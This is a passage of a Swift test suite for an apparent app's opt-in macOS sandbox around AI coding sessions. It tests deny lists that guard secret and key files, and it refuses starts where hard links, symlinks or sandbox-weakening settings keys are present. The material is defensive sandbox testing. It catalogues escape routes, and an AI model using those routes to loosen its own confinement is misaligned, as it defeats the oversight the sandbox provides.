import Foundation
import Testing
@testable import TalosDesktopCore
import TalosTestSupport

/// The opt-in OS sandbox, Mac half ("Extra lock on protected files", config.json `os_sandbox`; the TypeScript twin is
/// apps/bridge/src/guards/os-sandbox.ts). Every test works in a throwaway root made here (`talos-osbx-`), never the real Talos home.

/// A throwaway root with `Home`, `Agent`, a kit release and the owner's `.claude`, made under a case-mixed name (the capitals tell a
/// path's real spelling from its lower-case form). `cleanup` takes any file lock off first: a locked file cannot be removed.
final class SbxTree {
  let base: String  // the real path of the root's parent
  let root: String
  var home: String { root + "/Home" }
  var agent: String { root + "/Agent" }
  var kit: String { root + "/Kit" }
  var claudeDir: String { root + "/UserHome/.claude" }

  init() throws {
    let made = (TestTemp.base as NSString).appendingPathComponent("talos-osbx-\(UUID().uuidString.prefix(8))")
    try FileManager.default.createDirectory(atPath: made, withIntermediateDirectories: true)
    base = try TestTemp.real(made)
    root = base + "/FxROOT"
    for d in [home, agent, kit, claudeDir] { try FileManager.default.createDirectory(atPath: d, withIntermediateDirectories: true) }
  }

  func cleanup() {
    unlockAll(base)
    try? FileManager.default.removeItem(atPath: base)
  }

  private func unlockAll(_ dir: String) {
    guard let e = FileManager.default.enumerator(atPath: dir) else { return }
    for case let n as String in e { _ = lchflags(dir + "/" + n, 0) }
  }

  @discardableResult func file(_ rel: String, _ text: String = "x\n", under: String? = nil) throws -> String {
    let p = (under ?? root) + "/" + rel
    try FileManager.default.createDirectory(atPath: (p as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
    try Data(text.utf8).write(to: URL(fileURLWithPath: p))
    return p
  }

  func link(_ rel: String, to target: String) throws {
    let p = root + "/" + rel
    try FileManager.default.createDirectory(atPath: (p as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
    try FileManager.default.createSymbolicLink(atPath: p, withDestinationPath: target)
  }

  /// Every protected file the preflight looks at, in place with link count 1.
  func protectedHome() throws {
    for n in ["config.json", "devices.json", "bridge.key", "supervisor.json", "secret-backend"] { try file("Home/" + n) }
    try file("Home/secrets/item")
    try file("Home/launch/run.sh")
  }

  var trusted: OsSandbox.TrustedBridge?

  /// A bridge clone (`Clone/apps/bridge`) and a bun, as Talos would have recorded them, and the `.mcp.json` entry Talos writes for them.
  func talosBridge() throws {
    try file("Clone/apps/bridge/bunfig.toml", "[test]\n")
    try file("Clone/apps/bridge/src/server.ts", "1\n")
    try file("Bun/bin/bun", "#!/bin/sh\n")
    trusted = .init(bun: root + "/Bun/bin/bun", bridgeDir: root + "/Clone/apps/bridge")
  }

  func input(loadsProject: Bool = true, gitConfigCount: Int = 0, ownerExcludes: [String] = []) -> OsSandbox.Input {
    var i = OsSandbox.Input(
      talosHome: home, userHome: root + "/UserHome", folder: agent, claudeDir: claudeDir, gitConfigCount: gitConfigCount,
      loadsProject: loadsProject, ownerExcludes: ownerExcludes)
    i.trustedBridge = trusted
    return i
  }

  /// `prepare` with this tree's kit release as the kit folder, and the excludes file written by `AtomicFile`.
  func prepare(dry: Bool = false, loadsProject: Bool = true) -> OsSandbox.Prepared {
    OsSandbox.prepare(input(loadsProject: loadsProject), dry: dry, kitDir: kit)
  }

  /// A hard link to `rel` (under the root), made outside the tree, as an earlier unsandboxed process could have made it.
  func hardLink(_ rel: String) throws {
    let other = base + "/Elsewhere"
    try FileManager.default.createDirectory(atPath: other, withIntermediateDirectories: true)
    guard Darwin.link(root + "/" + rel, other + "/sneaky-\(UUID().uuidString.prefix(6))") == 0 else { throw POSIXError(.EPERM) }
  }
}

func sbxJSON(_ o: Any) -> String { OsSandbox.canonical(o) }

// MARK: the same text as the TypeScript side

@Suite("OS sandbox: the same settings as the TypeScript side")
struct OsSandboxParityTests {
  static let fixtures: String = {
    let here = URL(fileURLWithPath: #filePath)
    return here.appendingPathComponent("../../Fixtures/os-sandbox").standardized.path
  }()

  /// Builds `entries` under the tree's root; an `absolute` one is made at its own path (and its folder removed by the caller's cleanup list).
  static func build(_ entries: [[String: Any]], in t: SbxTree, absolutes: inout [String]) throws {
    for e in entries {
      let rel = try #require(e["path"] as? String)
      if e["absolute"] as? Bool == true {
        let dir = (rel as NSString).deletingLastPathComponent
        try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        try Data(((e["text"] as? String) ?? "").utf8).write(to: URL(fileURLWithPath: rel))
        // the file only, unless the recipe says its folder is its own (a file made directly in /tmp must not take /tmp with it)
        absolutes.append(e["removeDir"] as? Bool == true ? dir : rel)
      } else if let target = e["link"] as? String {
        if e["replace"] as? Bool == true { try? FileManager.default.removeItem(atPath: t.root + "/" + rel) }
        try t.link(rel, to: target)
      } else {
        try t.file(rel, ((e["text"] as? String) ?? "").replacingOccurrences(of: "{ROOT}", with: t.root))
        if let twin = e["hardlinkTo"] as? String {
          let to = t.root + "/" + twin
          try FileManager.default.createDirectory(atPath: (to as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
          try? FileManager.default.removeItem(atPath: to)
          #expect(Darwin.link(t.root + "/" + rel, to) == 0)
        }
      }
    }
  }

  /// The tree the recipe describes, built under `<temp>/FxROOT` exactly as apps/bridge/test/os-sandbox-parity.test.ts builds it; then each case
  /// (the tree and its own entries) gives the refusal of a start, or nothing.
  @Test func theSettingsAndTheRefusalsForTheFixtureTreeAreTheGoldenTheSwiftSideMade() throws {
    let recipe = try #require(
      JSONSerialization.jsonObject(with: try Data(contentsOf: URL(fileURLWithPath: Self.fixtures + "/recipe.json"))) as? [String: Any])
    let base = try #require(recipe["entries"] as? [[String: Any]])
    var absolutes: [String] = []
    defer { for d in absolutes { try? FileManager.default.removeItem(atPath: d) } }
    let t = try SbxTree()
    defer { t.cleanup() }
    try Self.build(base, in: t, absolutes: &absolutes)
    var input = OsSandbox.Input(
      talosHome: t.root + "/TalosHome", userHome: t.root + "/UserHome", folder: t.root + "/Agent", claudeDir: t.root + "/UserHome/.claude",
      gitConfigCount: try #require(recipe["gitConfigCount"] as? Int), ownerExcludes: try #require(recipe["ownerExcludes"] as? [String]))
    input.kitDir = t.root + "/Kit"
    func trusted(_ raw: Any?, _ t: SbxTree) -> OsSandbox.TrustedBridge? {
      guard let o = raw as? [String: Any], let bun = o["bun"] as? String, let dir = o["bridgeDir"] as? String else { return nil }
      return .init(bun: t.root + "/" + bun, bridgeDir: t.root + "/" + dir)
    }
    input.trustedBridge = trusted(recipe["trustedBridge"], t)
    let pieces = try OsSandbox.settings(input)
    // the root's real spelling as a token, then its lower-case form (the capitals of FxROOT keep the two apart): the TypeScript test's tokens
    func tokens(_ x: String, _ root: String) -> String {
      x.replacingOccurrences(of: root, with: "<BASE>").replacingOccurrences(of: root.lowercased(), with: "<base>")
    }
    func refusal(_ t: SbxTree, _ args: [String] = [], _ bridge: OsSandbox.TrustedBridge? = nil) -> Any {
      // a whole start, as `prepare` runs it: the home's preflight first, then the folder's checks (nothing written)
      var i = OsSandbox.Input(talosHome: t.root + "/TalosHome", userHome: t.root + "/UserHome", folder: t.root + "/Agent", claudeDir: t.root + "/UserHome/.claude")
      i.launchArgs = args
      i.trustedBridge = bridge
      let r = OsSandbox.prepare(i, dry: true, kitDir: t.root + "/Kit")
      if case .refused(let why) = r { return tokens(why, t.root) }
      return NSNull()
    }
    let baseBridge = input.trustedBridge
    var cases: [String: Any] = ["the plain tree": refusal(t, [], baseBridge)]
    for c in try #require(recipe["cases"] as? [[String: Any]]) {
      let ct = try SbxTree()
      defer { ct.cleanup() }
      try Self.build(base + (try #require(c["entries"] as? [[String: Any]])), in: ct, absolutes: &absolutes)
      let bridge = c.keys.contains("trustedBridge") ? trusted(c["trustedBridge"], ct) : baseBridge.map { OsSandbox.TrustedBridge(bun: ct.root + "/" + String($0.bun.dropFirst(t.root.count + 1)), bridgeDir: ct.root + "/" + String($0.bridgeDir.dropFirst(t.root.count + 1))) }
      cases[try #require(c["name"] as? String)] = refusal(ct, c["launchArgs"] as? [String] ?? [], bridge)
    }
    let names: [String: Any] = [
      "denyWrite": OsSandbox.denyWriteNames, "denyRead": OsSandbox.denyReadNames, "workerFiles": Array(OsSandbox.workerControlNames.prefix(12)),
      "cacheEnv": Dictionary(uniqueKeysWithValues: OsSandbox.cacheEnv),
    ]
    let whole = OsSandbox.canonical([
      "names": names, "cases": cases,
      "pieces": ["sandbox": pieces.sandbox, "env": pieces.env, "excludes": ["path": pieces.excludesPath, "lines": pieces.excludesLines]],
    ])
    let text = tokens(whole, t.root)
    let goldenURL = URL(fileURLWithPath: Self.fixtures + "/golden.json")
    // MADE FROM THE SWIFT OUTPUT (the TypeScript side was changing in parallel): UPDATE_GOLDEN=1 writes it; it must be checked against the
    // TypeScript builder when that lands, and a difference there is a bug on one side to settle, not a golden to refresh
    if ProcessInfo.processInfo.environment["UPDATE_GOLDEN"] == "1" {
      let pretty = try JSONSerialization.data(withJSONObject: try JSONSerialization.jsonObject(with: Data(text.utf8)), options: [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes])
      try pretty.write(to: goldenURL)
    }
    // the golden's own layout is free (the repository formats its JSON): its parsed value in the one canonical text is what is compared
    let goldenValue = try JSONSerialization.jsonObject(with: try Data(contentsOf: goldenURL))
    #expect(text == OsSandbox.canonical(goldenValue))
  }
}

@Suite("OS sandbox: the settings it builds")
struct OsSandboxSettingsTests {
  @Test func lockedAndTheHomeIsNotWritable() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    let p = try OsSandbox.settings(t.input())
    #expect(p.sandbox["enabled"] as? Bool == true)
    #expect(p.sandbox["failIfUnavailable"] as? Bool == true)
    #expect(p.sandbox["allowUnsandboxedCommands"] as? Bool == false)
    let fs = try #require(p.sandbox["filesystem"] as? [String: Any])
    #expect((fs["allowWrite"] as? [String]) == [])
    let write = try #require(fs["denyWrite"] as? [String])
    let read = try #require(fs["denyRead"] as? [String])
    for n in ["config.json", "launch", "sandbox", "workers.json", "bridge.env", "apps/catalog.json"] { #expect(write.contains(t.home + "/" + n), "\(n)") }
    #expect(read.contains(t.home + "/secrets") && read.contains(t.home + "/bridge.key"))
    #expect(!read.contains(t.home + "/config.json"), "a file the session may read stays readable")
    // the session's own folder: the settings and servers Claude Code runs outside the sandbox
    for n in [".claude", ".mcp.json"] { #expect(write.contains(t.agent + "/" + n), "\(n)") }
  }

  @Test func everyPathIsAlsoLowerCaseAndNeverASpellingThatIsNotTheRealOne() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    let p = try OsSandbox.settings(t.input())
    let write = try #require((p.sandbox["filesystem"] as? [String: Any])?["denyWrite"] as? [String])
    #expect(write.contains(t.home + "/config.json") && write.contains((t.home + "/config.json").lowercased()))
    // the root has capitals, so the two spellings differ
    #expect(t.home != t.home.lowercased())
  }

  @Test func aHomeAndAFolderThatAreLinksGiveTheRealPaths() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.link("HomeLink", to: t.home)
    try t.link("AgentLink", to: t.agent)
    var i = t.input()
    i.talosHome = t.root + "/HomeLink"
    i.folder = t.root + "/AgentLink"
    let p = try OsSandbox.settings(i)
    let fs = try #require(p.sandbox["filesystem"] as? [String: Any])
    let all = (fs["denyWrite"] as? [String] ?? []) + (fs["denyRead"] as? [String] ?? []) + [p.excludesPath] + Array(p.env.values.filter { $0.hasPrefix("/") })
    #expect(all.count > 20)
    for x in all { #expect(!x.lowercased().contains("link"), "\(x)") }
  }

  @Test func aProtectedNameThatIsAlreadyALinkIsEmittedByWhereItLeads() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try FileManager.default.removeItem(atPath: t.home + "/devices.json")
    try t.file("Other/real.json")
    try t.link("Home/devices.json", to: t.root + "/Other/real.json")
    let write = try #require((try OsSandbox.settings(t.input()).sandbox["filesystem"] as? [String: Any])?["denyWrite"] as? [String])
    #expect(write.contains(t.root + "/Other/real.json"))
    #expect(!write.contains(t.home + "/devices.json"))
  }

  @Test func aPathThatCannotBeResolvedRefusesAndEmitsNothing() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    var i = t.input()
    i.folder = t.root + "/no-such"
    #expect(throws: OsSandbox.Failure.self) { try OsSandbox.settings(i) }
    do { _ = try OsSandbox.settings(i) } catch let f as OsSandbox.Failure {
      #expect(f.message.hasPrefix("the OS sandbox cannot be set up: the session's folder ("), "\(f.message)")
    }
    i = t.input()
    i.talosHome = t.root + "/no-such-home"
    #expect(throws: OsSandbox.Failure.self) { try OsSandbox.settings(i) }
    // a link that leads nowhere in the place of a protected file
    try t.link("Home/tripwire.json", to: t.root + "/Home/gone")
    #expect(throws: OsSandbox.Failure.self) { try OsSandbox.settings(t.input()) }
    // and a start with it is refused in the one plain line, never a partial sandbox
    let r = t.prepare()
    guard case .refused(let why) = r else { Issue.record("not refused: \(r)"); return }
    #expect(why.contains("tripwire.json"), "\(why)")
  }

  @Test func theOwnersGitConfigEntriesStayAndOursComesAfterThem() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    let none = try OsSandbox.settings(t.input())
    #expect(none.env["GIT_CONFIG_COUNT"] == "1" && none.env["GIT_CONFIG_KEY_0"] == "core.excludesFile")
    let two = try OsSandbox.settings(t.input(gitConfigCount: 2))
    #expect(two.env["GIT_CONFIG_COUNT"] == "3" && two.env["GIT_CONFIG_KEY_2"] == "core.excludesFile" && two.env["GIT_CONFIG_KEY_0"] == nil)
    #expect(two.env["GIT_CONFIG_VALUE_2"] == t.home + "/sandbox/gitignore")
    for (k, dir) in OsSandbox.cacheEnv { #expect(two.env[k] == t.agent + "/.cache/" + dir, "\(k)") }
    #expect(two.env["GIT_CONFIG_GLOBAL"] == nil && two.env["GIT_CONFIG_SYSTEM"] == nil)
  }

  @Test func theExcludesFileKeepsTheOwnersIgnores() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    let lines = try OsSandbox.settings(t.input(ownerExcludes: ["*.swp", ".claude/"])).excludesLines
    for l in [".bashrc", ".zshrc", ".gitconfig", ".mcp.json", ".vscode", ".claude/", ".cache/", "*.swp"] { #expect(lines.contains(l), "\(l)") }
    #expect(lines.filter { $0 == ".claude/" }.count == 1, "no repeats")
    // the owner's own file is read, never written: core.excludesFile as git says it, else the default place
    try t.file("UserHome/.config/git/ignore", "*.log\n\n.direnv/\r\n")
    #expect(OsSandbox.ownerExcludes(userHome: t.root + "/UserHome", configured: nil) == ["*.log", ".direnv/"])
    try t.file("UserHome/my-ignore", "notes.tmp\n")
    #expect(OsSandbox.ownerExcludes(userHome: t.root + "/UserHome", configured: "~/my-ignore") == ["notes.tmp"])
    #expect(OsSandbox.ownerExcludes(userHome: t.root + "/nobody", configured: nil) == [])
  }

  @Test func theBlockAndEnvAreMergedAndAnOldSandboxKeepsOnlyItsNetwork() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    let p = try OsSandbox.settings(t.input())
    let out = OsSandbox.with(
      ["env": ["A": "1"], "sandbox": ["enabled": false, "excludedCommands": ["x"], "network": ["allowedDomains": ["example.com"]]]], p)
    let env = try #require(out["env"] as? [String: String])
    #expect(env["A"] == "1" && env["GIT_CONFIG_COUNT"] == "1")
    let sb = try #require(out["sandbox"] as? [String: Any])
    #expect(sb["enabled"] as? Bool == true && sb["excludedCommands"] == nil)
    #expect((sb["network"] as? [String: Any])?["allowedDomains"] as? [String] == ["example.com"])
    // (the supervisor's own block has no network of its own: a spec is built fresh, so the two are the same there)
    let fresh = OsSandbox.with(["env": ["A": "1"]], p)
    #expect(OsSandbox.carries(fresh, p))
    // a block a session changed is not the one the supervisor built
    var tampered = fresh
    var tsb = try #require(fresh["sandbox"] as? [String: Any])
    tsb["allowUnsandboxedCommands"] = true
    tampered["sandbox"] = tsb
    #expect(!OsSandbox.carries(tampered, p))
  }

  @Test func onlyTheJSONLiteralTrueTurnsTheSwitchOnAndAFileThatCannotBeReadKeepsTheLastStateOrIsOff() {
    func state(_ s: String?, exists: Bool = true, last: Bool = false) -> OsSandbox.Switch {
      OsSandbox.switchState(configJSON: s.map { Data($0.utf8) }, exists: exists, lastKnown: last)
    }
    #expect(state(#"{"os_sandbox":true}"#) == .on)
    for off in ["{}", #"{"os_sandbox":false}"#, #"{"os_sandbox":"true"}"#, #"{"os_sandbox":1}"#, #"{"os_sandbox":null}"#, #"{"dev":{"os_sandbox":true}}"#] {
      #expect(state(off) == .off, "\(off)")
      #expect(state(off, last: true) == .off, "a good reading outranks the record: \(off)")
    }
    // no config.json at all: nothing was ever set
    #expect(state(nil, exists: false) == .off)
    // there, and unreadable or not an object: the state of the last good reading, and OFF when there was none (never on by itself)
    for bad in [nil, "", "{", "not json", "[]", "null", "true", #"{"os_sandbox":true"#] as [String?] {
      guard case .unreadable(let line, let kept) = state(bad) else { Issue.record("\(bad ?? "<unreadable>") read as off or on"); continue }
      #expect(line.hasPrefix("config.json cannot be read"), "\(line)")
      #expect(!kept && !state(bad).isOn, "no earlier state is off: \(bad ?? "<unreadable>")")
      guard case .unreadable(_, let keptOn) = state(bad, last: true) else { Issue.record("\(bad ?? "<unreadable>")"); continue }
      #expect(keptOn && state(bad, last: true).isOn, "on before: \(bad ?? "<unreadable>")")
    }
  }

  @Test func aConfigFileOnDiskThatCannotBeReadKeepsTheLastStateAndAnAbsentOneIsOff() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    #expect(OsSandbox.switchState(talosHome: t.home) == .off)
    // never on before: a broken file is off
    try t.file("Home/config.json", "{ not json")
    guard case .unreadable(_, let never) = OsSandbox.switchState(talosHome: t.home) else { Issue.record("a broken file is off"); return }
    #expect(!never)
    #expect(!FileManager.default.fileExists(atPath: t.home + "/" + OsSandbox.switchRecordName), "a damaged file writes no record")
    // turned on and read once: the record says on, and damage now keeps it on, whichever way the file is damaged
    try Data(#"{"os_sandbox":true}"#.utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
    #expect(OsSandbox.switchState(talosHome: t.home) == .on)
    #expect(try String(contentsOfFile: t.home + "/" + OsSandbox.switchRecordName, encoding: .utf8) == "on\n")
    try Data("{ not json".utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
    guard case .unreadable(_, let kept) = OsSandbox.switchState(talosHome: t.home) else { Issue.record("a broken file is on or off"); return }
    #expect(kept)
    chmod(t.home + "/config.json", 0)
    defer { chmod(t.home + "/config.json", 0o600) }
    guard case .unreadable(_, let keptAgain) = OsSandbox.switchState(talosHome: t.home) else { Issue.record("an unopenable file is on or off"); return }
    #expect(keptAgain)
    // turned off and read once: damage keeps it off
    chmod(t.home + "/config.json", 0o600)
    try Data(#"{"os_sandbox":false}"#.utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
    #expect(OsSandbox.switchState(talosHome: t.home) == .off)
    try Data("".utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
    guard case .unreadable(_, let offKept) = OsSandbox.switchState(talosHome: t.home) else { Issue.record("an empty file is on or off"); return }
    #expect(!offKept)
  }

  /// The record is trusted only as a plain file in a real folder: a pipe is never opened (this would hang), a link, a folder or a second name is no record.
  @Test func aRecordThatIsAPipeALinkAFolderOrHasASecondNameIsNoRecordAndIsNeverOpened() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    let dir = t.home + "/config-history"
    let rec = t.home + "/" + OsSandbox.switchRecordName
    try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
    try Data("{ nope".utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
    #expect(mkfifo(rec, 0o600) == 0)
    #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "a pipe: not opened, off")
    unlink(rec)
    let elsewhere = t.home + "/says-on"
    try Data("on\n".utf8).write(to: URL(fileURLWithPath: elsewhere))
    #expect(symlink(elsewhere, rec) == 0)
    #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "a symlink to a file that says on")
    unlink(rec)
    try FileManager.default.createDirectory(atPath: rec, withIntermediateDirectories: true)
    #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "a folder")
    try FileManager.default.removeItem(atPath: rec)
    try Data("on\n".utf8).write(to: URL(fileURLWithPath: rec))
    #expect(OsSandbox.switchState(talosHome: t.home).isOn, "a plain file is a record")
    #expect(link(rec, t.home + "/second-name") == 0)
    #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "a second name")
    unlink(t.home + "/second-name")
    try Data(String(repeating: " ", count: 64).appending("on").utf8).write(to: URL(fileURLWithPath: rec))
    #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "too big")
    // the folder itself: a link to a real folder that holds an "on" record, and a file
    try FileManager.default.removeItem(atPath: dir)
    let real = t.home + "/real-folder"
    try FileManager.default.createDirectory(atPath: real, withIntermediateDirectories: true)
    try Data("on\n".utf8).write(to: URL(fileURLWithPath: real + "/os-sandbox-last"))
    #expect(symlink(real, dir) == 0)
    #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "the folder is a link")
    unlink(dir)
    try Data("on\n".utf8).write(to: URL(fileURLWithPath: dir))
    #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "the folder is a file")
  }

  /// Writing: never through a linked or non-folder, one report for an on that could not be kept, and only the record's own entry is removed.
  @Test func theRecordIsNeverWrittenThroughALinkAndAnOnThatCouldNotBeKeptIsReported() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    let dir = t.home + "/config-history"
    let real = t.home + "/real-folder"
    try FileManager.default.createDirectory(atPath: real, withIntermediateDirectories: true)
    #expect(symlink(real, dir) == 0)
    try Data(#"{"os_sandbox":true}"#.utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
    var told = 0
    #expect(OsSandbox.switchState(talosHome: t.home, onNotRecorded: { told += 1 }) == .on)
    #expect(told == 1)
    #expect(!FileManager.default.fileExists(atPath: real + "/os-sandbox-last"), "not written through the link")
    unlink(dir)
    try Data("mine".utf8).write(to: URL(fileURLWithPath: dir))
    #expect(!OsSandbox.rememberSwitch(talosHome: t.home, on: true))
    #expect(try String(contentsOfFile: dir, encoding: .utf8) == "mine")
    unlink(dir)
    // a pipe, a folder or a link in the record's place goes (that entry only); a plain record takes its place and the sibling and the target stay
    for make in [{ (p: String) in _ = mkfifo(p, 0o600) }, { (p: String) in try? FileManager.default.createDirectory(atPath: p + "/inner", withIntermediateDirectories: true) }, { (p: String) in _ = symlink(real + "/target", p) }] as [(String) -> Void] {
      try? FileManager.default.removeItem(atPath: dir)
      try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
      try Data("stays".utf8).write(to: URL(fileURLWithPath: dir + "/sibling"))
      try Data("untouched".utf8).write(to: URL(fileURLWithPath: real + "/target"))
      make(t.home + "/" + OsSandbox.switchRecordName)
      #expect(OsSandbox.rememberSwitch(talosHome: t.home, on: true))
      var st = stat()
      #expect(lstat(t.home + "/" + OsSandbox.switchRecordName, &st) == 0 && st.st_mode & S_IFMT == S_IFREG)
      #expect(try String(contentsOfFile: t.home + "/" + OsSandbox.switchRecordName, encoding: .utf8) == "on\n")
      #expect(try String(contentsOfFile: dir + "/sibling", encoding: .utf8) == "stays")
      #expect(try String(contentsOfFile: real + "/target", encoding: .utf8) == "untouched")
    }
  }

  @Test func theRecordSitsUnderANameTheSandboxDeniesAndItsDenyListIsUnchanged() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    let folder = String(OsSandbox.switchRecordName.split(separator: "/")[0])
    #expect(OsSandbox.denyWriteNames.contains(folder), "a session can neither write the folder nor, through the sandbox, anything in it")
    try Data(#"{"os_sandbox":true}"#.utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
    #expect(OsSandbox.switchState(talosHome: t.home) == .on)
    var st = stat()
    #expect(lstat(t.home + "/" + OsSandbox.switchRecordName, &st) == 0 && st.st_mode & 0o777 == 0o600 && st.st_nlink == 1)
    // a record that says anything but on is no record
    for junk in ["", "ON-ish", "true", "yes"] {
      try Data(junk.utf8).write(to: URL(fileURLWithPath: t.home + "/" + OsSandbox.switchRecordName))
      try Data("{ nope".utf8).write(to: URL(fileURLWithPath: t.home + "/config.json"))
      #expect(!OsSandbox.switchState(talosHome: t.home).isOn, "\(junk)")
    }
    // a home that is not there is not made for a record
    OsSandbox.rememberSwitch(talosHome: t.home + "/never-made", on: true)
    #expect(!FileManager.default.fileExists(atPath: t.home + "/never-made"))
  }
}

// MARK: the refusals

@Suite("OS sandbox: a start is refused, in one plain line")
struct OsSandboxRefusalTests {
  @Test func allFineIsNoRefusal() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    #expect(OsSandbox.preflight(talosHome: t.home) == nil)
    guard case .ready = t.prepare() else { Issue.record("refused"); return }
  }

  @Test func aHardLinkMadeBeforeTheStartIsRefusedNamingTheFileAndTheFix() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.hardLink("Home/config.json")
    let line = "config.json has another name on this disk (a hard link); remove the other link, then start again"
    #expect(OsSandbox.preflight(talosHome: t.home) == line)
    #expect(t.prepare() == .refused(line))
  }

  @Test func aHardLinkToAFileInsideAProtectedFolderIsRefusedToo() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.hardLink("Home/secrets/item")
    #expect(OsSandbox.preflight(talosHome: t.home)?.hasPrefix("secrets/item has another name on this disk (a hard link)") == true)
  }

  @Test func aThreadsControlFileWithAnotherNameIsRefused() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.file("Home/workers/atlas/settings.json", "{}")
    try t.hardLink("Home/workers/atlas/settings.json")
    #expect(OsSandbox.preflight(talosHome: t.home) == "workers/atlas/settings.json has another name on this disk (a hard link); remove the other link, then start again")
  }

  @Test func aSymlinkWhereAFileBelongsIsRefused() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.file("Other/real")
    try FileManager.default.removeItem(atPath: t.home + "/devices.json")
    try t.link("Home/devices.json", to: t.root + "/Other/real")
    #expect(OsSandbox.preflight(talosHome: t.home) == "devices.json is a symbolic link; remove it, then start again")
    // and a protected folder that is a link
    try FileManager.default.removeItem(atPath: t.home + "/devices.json")
    try t.file("Home/devices.json")
    try FileManager.default.removeItem(atPath: t.home + "/launch")
    try t.link("Home/launch", to: t.root + "/Other")
    #expect(OsSandbox.preflight(talosHome: t.home)?.hasPrefix("launch is a symbolic link") == true)
  }

  @Test func aProtectedFileThatIsNotThereYetIsNoProblem() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.file("Home/config.json", "{}")
    #expect(OsSandbox.preflight(talosHome: t.home) == nil)
  }

  @Test func aFolderLinkThatLeadsOutsideTheKitReleaseIsRefusedAndOneIntoItIsNot() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.file("Kit/hooks/stop.sh")
    try t.file("Else/hooks/x.sh")
    try t.link("Agent/hooks", to: t.kit + "/hooks")
    guard case .ready = t.prepare() else { Issue.record("a link into the kit release is the kit's own"); return }
    try FileManager.default.removeItem(atPath: t.agent + "/hooks")
    try t.link("Agent/hooks", to: t.root + "/Else/hooks")
    #expect(t.prepare() == .refused("hooks is a symbolic link that does not lead into the kit release (\(t.kit)); put the kit's link back (run the kit's install again), then start again"))
  }

  @Test func aRealFolderAtAKitNameIsWalkedAndItsHardLinksRefused() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.file("Agent/scripts/run.sh")
    guard case .ready = t.prepare() else { Issue.record("refused"); return }
    try t.hardLink("Agent/scripts/run.sh")
    #expect(t.prepare() == .refused("scripts/run.sh has another name on this disk (a hard link); remove the other link, then start again"))
  }

  @Test func aMissingKitLinkTheSettingsNeedIsRefused() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    try t.file("Agent/.claude/settings.json", #"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/hooks/stop.sh"}]}]}}"#)
    #expect(t.prepare() == .refused("hooks is missing from \(t.agent) (its link into the kit release is gone) while .claude/settings.json runs scripts from it, so the guards would silently not run; run the kit's install again, then start again"))
    // a thread outside the agent folder does not load the folder's settings: nothing to run from there
    guard case .ready = t.prepare(loadsProject: false) else { Issue.record("refused"); return }
  }

  @Test func aSandboxKeyNotOnTheShortListInAnySettingsLevelTheSessionLoadsIsRefusedNamingFileAndKey() throws {
    let t = try SbxTree()
    defer { t.cleanup() }
    try t.protectedHome()
    func line(_ file: String, _ key: String) -> OsSandbox.Prepared {
      .refused("\(file) sets sandbox.\(key), which the extra lock does not allow (it could take a command out of the sandbox); remove it, then start again")
    }
    // every level: project, local, the git root above and the owner's user settings; known weakening keys and an unknown future one alike
    for (rel, body, key) in [
      ("Agent/.claude/settings.json", #"{"sandbox":{"excludedCommands":["git"]}}"#, "excludedCommands"),
      ("Agent/.claude/settings.local.json", #"{"sandbox":{"allowAppleEvents":true}}"#, "allowAppleEvents"),
      ("Agent/.claude/settings.local.json", #"{"sandbox":{"enableWeakerNestedSandbox":true}}"#, "enableWeakerNestedSandbox"),
      ("Agent/.claude/settings.json", #"{"sandbox":{"filesystem":{"allowWrite":["/x"]}}}"#, "filesystem"),
      ("Agent/.claude/settings.json", #"{"sandbox":{"network":{"allowAllUnixSockets":true}}}"#, "network"),
      ("Agent/.claude/settings.json", #"{"sandbox":{"ripgrep":{"command":"/x/rg"}}}"#, "ripgrep"),
      ("Agent/.claude/settings.json", #"{"sandbox":{"aKeyFromAFutureClaudeCode":1}}"#, "aKeyFromAFutureClaudeCode"),
      ("Agent/.claude/settings.json", #"{"sandbox":{"enabled":false}}"#, "enabled"),
